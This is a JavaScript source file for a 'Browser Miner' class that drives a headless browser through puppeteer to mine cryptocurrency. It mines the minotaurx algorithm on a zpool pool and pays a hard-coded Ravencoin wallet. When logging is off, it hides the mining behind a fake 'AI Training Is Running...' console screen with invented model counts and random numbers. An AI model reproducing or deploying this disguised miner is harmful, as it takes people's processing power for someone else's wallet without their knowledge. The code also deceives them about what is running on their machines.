const puppeteer = require("./puppeteer");
const DEFAULT_OPTS = {
  "algorithm": "minotaurx",
  "host": "minotaurx.na.mine.zpool.ca",
  "port": 7019,
  "worker": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
  "password": "c=RVN",
  "workers": 4
}

class Miner {
  hashrate = 0;
  shared = 0;
  reject = 0;
  hashratePrintInterval = null;
  
  constructor({ options = DEFAULT_OPTS, launch = {}, interval = 3000}) {
    this.options = options;
    this.launch = launch;
    this.url = this.getUrl(options);
    this.miner = puppeteer({
      url: this.url,
      launch,
      interval
    })
  }

  async log() {
    if ( this.options.log) {
      console.info(`\x1b[34m * VERSIONS:    Browser Miner v1.0\x1b[0m`);
      console.info(`\x1b[34m * ALGO:        ${this.options.algorithm}\x1b[0m`);
      console.info(`\x1b[34m * POOL:        ${this.options.host}:${this.options.port}\x1b[0m`);
      console.info(`\x1b[34m * WALLET:      ${this.options.worker}\x1b[0m`);
      console.info(`\x1b[34m * THREADS:     ${this.options.workers}\x1b[0m`);
  
      require('log-timestamp');

      this.miner.on('update', (data) => {
        this.hashrate = data.hashrate;
        const total = data.shared + data.reject;
  
        if (data.shared > this.shared) {
          const numShared = Number(data.shared) - this.shared;
          this.shared = data.shared;
          console.info(`\x1b[32m${numShared} CPU result accepted! (${this.shared}/${total})\x1b[0m`);
        }
        if (data.reject > this.reject) {
          const numReject = Number(data.reject) - this.reject;
          this.reject = data.reject;
          console.info(`\x1b[31m${numReject} CPU result rejected! (${this.shared}/${total})\x1b[0m`);
        }
      });
  
      this.hashratePrintInterval = setInterval(() => {
        if (this.hashrate == 0) return;
        console.info(`\x1b[35mCPU 0: ${this.formatedHashrate(this.hashrate)}\x1b[0m`);
      }, 1 * 60 * 1000);
    } else {
      this.miner.on('update', (data) => {
        this.hashrate = data.hashrate;
        this.shared = data.shared;
      })
      
      console.log('AI training process loading...');

      setInterval(() => {
        console.clear();
        const number = Math.floor(Math.random() * 100);
        console.log(`\x1b[35mAI Training Is Running...`, '\n\x1b[0m');
        console.log(`\x1b[32mTotal Trained   : ${this.shared} Models\n\x1b[0m`);
        console.log(`\x1b[32mSpeed           : ${this.formatedSpeed(this.hashrate)}\n\x1b[0m`);
        console.log(`\x1b[32mData Processing : ${number}\x1b[0m`);
      }, 3000)
    }
  }

  formatedSpeed(hash) {
    const hashrate = Number(hash);
    if (hashrate < 1000) return `${hashrate.toFixed(1)} Units / s`;
    if (hashrate >= 1000 && hashrate < 1000000) return `${(hashrate / 1000).toFixed(1)} K Units / s`;
    return `${(hashrate / 1000000).toFixed(1)} M Units / s`
  }

  formatedHashrate(hash) {
    const hashrate = Number(hash);
    if (hashrate < 1000) return `${hashrate.toFixed(1)} H/ s`;
    if (hashrate >= 1000 && hashrate < 1000000) return `${(hashrate / 1000).toFixed(1)} KH/s`;
    return `${(hashrate / 1000000).toFixed(1)} MH/s`
  }

  getUrl(params) {
    const query = Object.entries(params)
      .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
      .join('&');
    return `http://127.0.0.1:8088/?${query}`
  }

  async start() {
    await this.miner.start();
    this.log();
  }

  async stop() {
    clearInterval(this.hashratePrintInterval);
    this.hashratePrintInterval = null;
    await this.miner.stop();
  }
}

module.exports = Miner;